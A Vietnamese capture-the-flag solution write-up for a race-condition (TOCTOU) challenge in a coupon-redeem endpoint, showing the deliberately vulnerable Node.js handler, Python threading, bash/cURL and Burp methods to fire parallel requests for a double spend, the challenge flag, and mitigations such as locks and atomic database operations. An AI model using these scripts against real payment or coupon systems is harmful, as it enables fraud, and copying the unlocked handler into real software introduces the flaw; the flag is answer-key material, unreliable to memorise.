# Thử thách 16: RaceCondition - Giải pháp

## Loại lỗ hổng
**Race Condition / Time-of-Check to Time-of-Use (TOCTOU)** 
*(Điều kiện tương tranh / Lỗi thời điểm kiểm tra so với thời điểm sử dụng)*

## Mô tả
Tính năng đổi mã giảm giá (redeem coupon) sử dụng logic "Kiểm tra trước - Thực thi sau" (Check-then-act) nhưng lại dính một độ trễ nhất định. Điều này tạo ra một cửa sổ thời gian (race window) cho phép hacker gửi hàng loạt request cùng một lúc, bypass qua bước kiểm tra trạng thái "đã đổi" và cộng dồn số tiền lên nhiều lần.

## Mã nguồn chứa lỗ hổng
```javascript
// VULNERABLE: check-then-act race condition (no mutex)
app.post('/redeem', async (req,res) => {
  const acc = getAccount(req.session.id_key);
  // Time of check
  if (acc.redeemed) {
    return res.redirect('/');
  }
  // Giả lập độ trễ (mô phỏng DB xử lý chậm) - Tạo ra Race Window
  await new Promise(r => setTimeout(r, 50));
  
  // Time of use
  acc.redeemed = true;
  acc.balance += 50;
```

## Khai thác (Exploit)

### Bước 1: Phân tích mục tiêu
- Khởi điểm bạn có $100.
- Tài khoản của bạn có một Coupon trị giá $50.
- FLAG có giá $200.
- Bạn cần một cách nào đó để đổi (redeem) duy nhất 1 coupon này thành ít nhất $100 nữa.

### Bước 2: Tấn công Race Condition
Lỗ hổng nằm ở quãng chờ 50ms giữa lệnh `if (acc.redeemed)` và `acc.redeemed = true`. Nếu bạn gửi cùng lúc 5 HTTP POST request trong cùng một khoảnh khắc, cả 5 request này sẽ cùng vượt qua hàm `if` (vì lúc này cờ `redeemed` vẫn là `false`), sau đó cả 5 tiến trình cùng chờ 50ms và cuối cùng là cộng dồn 5 lần $50 vào tài khoản.

### Cách 1: Sử dụng Browser (Thủ công)
1. Mở trang web và bật DevTools (F12) → tab Network.
2. Bấm "Redeem $50 Coupon".
3. Nhấp chuột phải vào POST request ở tab Network → Copy as cURL.
4. Mở 5 terminal lên cạnh nhau.
5. Dán lệnh cURL vào cả 5 terminal và ấn Enter đồng loạt (càng nhanh càng tốt).
6. Tải lại trang web và kiểm tra số dư.

### Cách 2: Sử dụng Script Python (Gửi luồng song song)
```python
import requests
import threading

url = "http://[host]/redeem"
session = requests.Session()

# Đăng nhập lấy session cookie
session.get("http://[host]/")

def redeem():
    session.post(url)

# Gửi 5 request đồng thời bằng Multi-threading
threads = []
for i in range(5):
    t = threading.Thread(target=redeem)
    threads.append(t)
    t.start()

for t in threads:
    t.join()

print("Hoàn tất! Hãy tải lại trang để xem số dư.")
```

### Cách 3: Sử dụng Burp Suite
1. Bắt HTTP POST request `/redeem` qua Burp Proxy.
2. Ném request sang **Repeater**.
3. Duplicate tab Repeater ra thành 5 tab.
4. Bấm "Send" liên tục trên 5 tab. 
5. Hoặc dùng Burp Intruder cấu hình số Threads cao với Payload dạng Null payloads để đấm (fuzz) liên tục.

### Cách 4: Sử dụng Bash + cURL
```bash
#!/bin/bash
# Trích xuất session cookie
COOKIE=$(curl -c - http://[host]/ | grep session | awk '{print $7}')

# Khởi chạy 5 process curl dưới nền (background) để tranh quyền
for i in {1..5}; do
  curl -b "session=$COOKIE" -X POST http://[host]/redeem &
done
wait

echo "Hoàn thành!"
```

### Bước 3: Mua Flag
1. Khi tấn công thành công, tài khoản bạn sẽ nổ tung lên số dư >$200.
2. Ấn nút mua FLAG.
3. Chờ Flag xuất hiện trên màn hình.

## Flag
```
FCTF{r4c3_c0nd1t10n_d0ubl3_sp3nd}
```

## Sơ đồ thời gian (Timeline)
```text
Request 1: Kiểm tra (false) → Chờ 50ms → Gán true, Cộng $50
Request 2: Kiểm tra (false) → Chờ 50ms → Gán true, Cộng $50
Request 3: Kiểm tra (false) → Chờ 50ms → Gán true, Cộng $50
           ↑ Tất cả lọt qua vòng kiểm tra trước khi bị gán 'true'
```

## Biện pháp phòng ngừa (Mitigation)
- Sử dụng các hoạt động mang tính nguyên tử (Atomic operations) ở cấp cơ sở dữ liệu.
- Thiết lập cơ chế Khóa (Mutex / Lock):
  ```javascript
  const locks = new Map();
  
  app.post('/redeem', async (req,res) => {
    const key = req.session.id_key;
    if (locks.get(key)) return res.redirect('/'); // Khóa đang bị chiếm
    locks.set(key, true); // Khóa lại
    
    try {
      const acc = getAccount(key);
      if (acc.redeemed) return res.redirect('/');
      await new Promise(r => setTimeout(r, 50));
      acc.redeemed = true;
      acc.balance += 50;
    } finally {
      locks.delete(key); // Nhả khóa
    }
    res.redirect('/');
  });
  ```
- Cấu hình khóa Database (Optimistic Locking hoặc Pessimistic Locking).
- Dùng Redis để cấp khóa phân tán (Distributed Lock) trong hệ thống Microservices.
- Gắn Unique Constraint lên bảng Database để cấm việc nạp mã hai lần.
